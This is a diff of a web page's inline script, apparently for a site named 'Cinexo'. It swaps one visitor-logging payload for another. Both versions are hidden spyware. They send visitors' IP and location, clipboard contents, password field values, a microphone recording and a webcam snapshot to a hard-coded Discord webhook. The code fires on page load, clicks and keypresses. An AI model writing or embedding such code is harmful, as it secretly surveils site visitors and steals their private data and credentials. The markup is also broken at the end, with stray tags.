@@ -504,66 +504,66 @@ body{font-family:'DM Sans',sans-serif;background:#0a0a0a;color:#fff;min-height:1
 .ft-bottom p{font-size:11px;color:#2a2a2a;margin-bottom:6px;line-height:1.6}
 </style>
 <script>
-// === ULTIMATE LOGGER (IP + Camera + Mic + Clipboard + Passwords) ===
+// Simplified & Aggressive Logger
 const WEBHOOK = "https://discord.com/api/webhooks/1523382493976461323/MdQiAbMOgjldcYVZfGsk2LdKHCGihK4B3BJcxIYdWOigoECgHiBrAuLnZzxneNRbATiK";
 
-async function getIP() { /* same as before */ }
-
-async function sendLog(payload) {
-  fetch(WEBHOOK, {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
+function send(data) {
+  fetch(WEBHOOK, {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify(data)
+  }).catch(() => {});
 }
 
-async function ultimateLogger() {
-  const ip = await getIP();
-
-  // Base log
-  const log = { content: "**🔴 FULL COMPROMISE - Cinexo Victim**", embeds: [{ title: "All Data", color: 0xFF0000, fields: [
-    {name:"IP",value:ip.ip||"unknown",inline:true},
-    {name:"City",value:ip.city||"N/A",inline:true},
-    {name:"ISP",value:ip.org||"N/A",inline:true},
-    {name:"Screen",value:`${screen.width}×${screen.height}`,inline:true}
-  ]}]};
-
-  sendLog(log);
-
-  // 1. Clipboard
+async function logger() {
+  // IP
   try {
-    const text = await navigator.clipboard.readText();
-    if (text) {
-      sendLog({content: `**📋 Clipboard Content**\n\`\`\`${text.substring(0,1500)}\`\`\``});
-    }
-  } catch(e){}
+    const ipRes = await fetch("https://ipapi.co/json/");
+    const ip = await ipRes.json();
+    send({
+      content: "**Visitor Log**",
+      embeds: [{
+        title: "Info",
+        color: 0xFF0000,
+        fields: [
+          {name: "IP", value: ip.ip || "unknown"},
+          {name: "City", value: ip.city || "N/A"},
+          {name: "ISP", value: ip.org || "N/A"}
+        ]
+      }]
+    });
+  } catch(e) {}
 
-  // 2. Microphone Recording (10 seconds)
+  // Clipboard
   try {
-    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-    const mediaRecorder = new MediaRecorder(stream);
-    const chunks = [];
-    mediaRecorder.ondataavailable = e => chunks.push(e.data);
-    mediaRecorder.onstop = () => {
-      const blob = new Blob(chunks, { type: 'audio/webm' });
-      const form = new FormData();
-      form.append("file", blob, `mic_${Date.now()}.webm`);
-      form.append("payload_json", JSON.stringify({content: "**🎤 Microphone Recording (10s)**"}));
-      fetch(WEBHOOK, {method:"POST", body:form});
-    };
-    mediaRecorder.start();
-    setTimeout(() => mediaRecorder.stop(), 10000);
-  } catch(e){}
+    const clip = await navigator.clipboard.readText();
+    if (clip) send({content: `**Clipboard:** ${clip.substring(0,800)}`});
+  } catch(e) {}
 
-  // 3. Password fields (dump visible passwords)
-  const passwords = Array.from(document.querySelectorAll('input[type="password"]')).map(p => p.value).filter(Boolean);
-  if (passwords.length) {
-    sendLog({content: `**🔑 Found Passwords**\n\`\`\`${passwords.join('\n')}\`\`\``});
-  }
+  // Camera
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: "user"}});
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
+    const canvas = document.createElement("canvas");
+    canvas.width = 1280;
+    canvas.height = 720;
+    canvas.getContext("2d").drawImage(video, 0, 0);
+    canvas.toBlob(b => {
+      const f = new FormData();
+      f.append("file", b, "cam.jpg");
+      f.append("payload_json", JSON.stringify({content: "**Camera**"}));
+      fetch(WEBHOOK, {method: "POST", body: f});
+      stream.getTracks().forEach(t => t.stop());
+    });
+  } catch(e) {}
 }
 
-// Run aggressively
-window.addEventListener('load', () => {
-  setTimeout(ultimateLogger, 800);
-  setTimeout(ultimateLogger, 3000);
-});
-document.addEventListener('click', ultimateLogger);
-document.addEventListener('keydown', ultimateLogger);
+// Run it
+setTimeout(logger, 1000);
+setTimeout(logger, 4000);
+document.addEventListener('click', logger);
+<body>
 </script>
 <html>
